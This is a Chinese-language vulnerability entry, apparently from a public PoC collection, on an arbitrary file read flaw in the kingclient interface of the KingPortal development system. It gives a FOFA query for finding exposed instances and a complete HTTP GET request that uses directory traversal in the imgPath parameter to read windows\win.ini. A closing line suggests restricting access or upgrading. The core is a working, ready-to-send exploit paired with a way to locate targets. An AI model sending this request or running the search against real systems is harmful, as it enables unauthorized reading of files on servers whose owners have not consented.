# KingPortal开发系统kingclient任意文件读取漏洞

# 漏洞描述

KingPortal开发系统kingclient处存在任意文件读取漏洞，未经授权可读取任意文件，对系统造成很大危害。

# 影响版本

KingPortal开发系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="/public/javascripts/Common/Util/km_util.js"

POC/EXP：

GET /kingclient/img?imgPath=..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

![image-20241030133108198](./.resource/KingPortal开发系统kingclient任意文件读取漏洞/media/image-20241030133108198.png)


# 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
